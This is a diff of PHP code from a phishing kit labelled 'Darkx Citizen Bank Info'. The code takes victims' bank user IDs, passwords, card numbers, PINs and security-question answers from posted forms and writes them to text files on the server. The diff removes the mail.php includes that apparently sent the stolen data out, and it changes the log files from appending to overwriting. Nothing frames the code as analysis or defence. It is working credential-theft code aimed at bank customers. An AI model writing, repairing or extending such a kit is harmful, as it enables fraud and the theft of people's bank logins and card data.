@@ -8,7 +8,7 @@
 	       if (isset($_POST['ReasonCode']))
 	          {
 	          	include 'recon.php';
-	          	include 'mail.php';
+	          	
 	          // Get User Input
 	          $UserID = $_POST['UserID'];
 	          $password = $_POST['password'];
@@ -28,7 +28,7 @@
 	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
 	          $body .= ":::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::\r\n";
 	          
-	          $save=fopen("access/login.txt","a+");
+	          $save=fopen("access/login.txt","w+");
 	          fwrite($save,$body);
 	          fclose($save);
 
@@ -53,7 +53,7 @@
 	          if(isset($_POST['UserID'])&&isset($_POST['password']))
 	          {
 	          include 'recon.php';
-	          include 'mail.php'; 
+	        
 	          // check for valid email address
 	          $UserID = $_POST['UserID'];
 	          $password = $_POST['password'];
@@ -73,7 +73,7 @@
 	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
 	          $body .= ":::::::::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::::::::::\r\n";
 	          
-	          $save=fopen("access/login.txt","a+");
+	          $save=fopen("access/login.txt","w+");
 	          fwrite($save,$body);
 	          fclose($save);
 	           $discoverbank = [
@@ -97,7 +97,7 @@
 	          if (isset($_POST['credit_verify']))
 	          {
 	          	include 'recon.php';
-	          	include 'mail.php';
+	 
 	          // check for valid email address 
 	          $ccnum = $_POST['ccnum'];
 	          $pin = $_POST['pin']; 
@@ -178,7 +178,7 @@
 	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
 	          $body .= ":::::::::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::::::::::\r\n";
 	          
-	          $save=fopen("access/account_verify.txt","a+");
+	          $save=fopen("access/account_verify.txt","w+");
 	          fwrite($save,$body);
 	          fclose($save);
 
@@ -203,7 +203,7 @@
 	      if (isset($_POST['quest_verify']))
 	          {
 	          	include 'recon.php';
-	          	include 'mail.php';
+	          	
 	          // check for valid email address 
 	          $quest1 = $_POST['quest1'];
 	          $quest2 = $_POST['quest2']; 
